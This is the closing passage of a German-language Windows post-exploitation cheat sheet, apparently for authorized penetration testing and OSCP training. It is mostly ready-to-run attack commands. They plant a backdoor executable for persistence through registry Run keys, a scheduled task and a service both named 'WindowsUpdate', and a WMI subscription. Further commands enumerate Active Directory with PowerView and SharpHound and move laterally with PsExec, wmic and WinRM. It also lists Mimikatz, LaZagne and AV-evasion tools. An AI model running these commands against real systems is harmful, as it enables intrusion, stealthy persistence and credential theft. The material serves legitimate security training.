
#### Registry Run Keys
```cmd
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

#### Scheduled Task
```cmd
schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru System
```

#### WMI Event Subscription
```powershell
# Persistence via WMI
$FilterArgs = @{name='Persistence'; EventNameSpace='root\CimV2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
```

#### Service
```cmd
sc create "WindowsUpdate" binPath= "C:\backdoor.exe" start= auto
sc start "WindowsUpdate"
```

### 69. Domain Enumeration (wenn Domain-joined)
```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainUser
Get-DomainComputer
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"

# BloodHound
SharpHound.exe -c All
# Importiere in BloodHound GUI

# ADRecon
.\ADRecon.ps1
```

### 70. Lateral Movement
```cmd
# PsExec
psexec.exe \\target -u admin -p pass cmd

# WMI
wmic /node:target /user:admin /password:pass process call create "cmd.exe"

# WinRM
winrs -r:target -u:admin -p:pass cmd

# PowerShell Remoting
Enter-PSSession -ComputerName target -Credential (Get-Credential)

# RDP
mstsc /v:target
```

---

## Empfohlene Methoden nach Szenario

### Schnelle Enumeration
1. **WinPEAS** (#8) - Automated Scanner
2. **PowerUp** (#8) - PowerShell Enumeration
3. **accesschk.exe** (#11) - Permissions Check

### Service Accounts (IIS, SQL, etc.)
1. **SeImpersonate** (#22) - JuicyPotato/PrintSpoofer
2. **Token Manipulation** (#21)

### Standard User
1. **Kernel Exploits** (#10)
2. **AlwaysInstallElevated** (#17, #28)
3. **Unquoted Service Path** (#27)

### Domain User
1. **GPP Passwords** (#41)
2. **Kerberos Delegation** (#60-62)
3. **WSUS Exploit** (#63)

### Local Admin (UAC)
1. **UAC Bypass** (#39-40)
2. **Fodhelper, Eventvwr, etc.**

### Post-Exploitation
1. **LSASS Dump** (siehe separate MD)
2. **BloodHound** (#69)
3. **Persistence** (#68)

---

## Tools Übersicht

### Enumeration
- WinPEAS
- PowerUp
- PrivescCheck
- Seatbelt
- JAWS
- Watson
- Sherlock
- accesschk.exe

### Exploitation
- Mimikatz
- JuicyPotato / RoguePotato / PrintSpoofer / GodPotato
- PsExec
- Rubeus
- Impacket Suite
- CrackMapExec

### AV Evasion
- Invoke-Obfuscation
- AMSITrigger
- Donut
- Veil

### Post-Exploitation
- BloodHound + SharpHound
- PowerView
- Invoke-Mimikatz
- LaZagne
- SessionGopher

---

## Wichtige Hinweise

- **Admin vs SYSTEM**: Viele Exploits erfordern SYSTEM-Rechte, nicht nur Admin
- **Privileges**: Immer `whoami /priv` prüfen
- **UAC**: Kann exploits blockieren, UAC Bypass nötig
- **Patches**: Kernel Exploits funktionieren nur bei ungepatchten Systemen
- **EDR/AV**: Moderne Endpoint Protection erkennt viele Tools
- **Logging**: Windows Event Logs, Sysmon, EDR loggen verdächtige Aktivitäten
- **Credential Guard**: Verhindert viele Credential Theft Techniken
- **PPL**: Protected Process Light schützt kritische Prozesse

---

## Rechtliche Hinweise

Diese Methoden dürfen NUR verwendet werden für:
- Autorisierte Penetrationstests mit schriftlicher Genehmigung
- CTF-Wettbewerbe und Security Challenges
- Forensische Analysen auf eigenen Systemen
- Sicherheitsforschung in kontrollierten Umgebungen
- Defensive Security und Incident Response

Unbefugte Nutzung verstößt gegen CFAA (USA), Computer Misuse Act (UK), StGB §202a-c (DE) und ähnliche Gesetze weltweit.

---

**Erstellt**: 2025-10-30
**System**: Windows
**Kontext**: Autorisierter Penetrationstest / OSCP Training
